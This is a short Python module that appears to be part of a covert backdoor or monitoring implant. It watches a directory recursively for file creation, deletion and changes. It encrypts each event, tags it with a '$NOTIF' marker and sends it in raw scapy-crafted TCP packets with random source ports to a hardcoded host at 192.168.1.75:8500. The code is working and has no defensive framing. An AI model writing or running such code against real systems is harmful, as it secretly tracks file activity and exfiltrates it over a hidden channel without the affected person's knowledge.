import pyinotify
from scapy.all import *
from datetime import datetime
import encryption


class EventHandler(pyinotify.ProcessEvent):
    def process_IN_CREATE(self, event):
        self.send_notif("Created", event.pathname)

    def process_IN_DELETE(self, event):
        self.send_notif("Deleted", event.pathname)

    def process_IN_MODIFY(self, event):
        self.send_notif("Modified", event.pathname)

    def send_notif(self, action, data):
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = f"[{current_time}] {action}: {data}"
        encrypted_msg = encryption.encrypt_data(msg.encode("utf-8"))
        encrypted_msg += b"$NOTIF"

        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8500)/encrypted_msg

        send(pkt, verbose=False)


def start_watchdir(dirname):
    watch_manager = pyinotify.WatchManager()
    mask = pyinotify.IN_CREATE | pyinotify.IN_DELETE | pyinotify.IN_MODIFY

    notifier = pyinotify.ThreadedNotifier(watch_manager, EventHandler())
    watch_manager.add_watch(dirname, mask, rec=True)

    notifier.start()
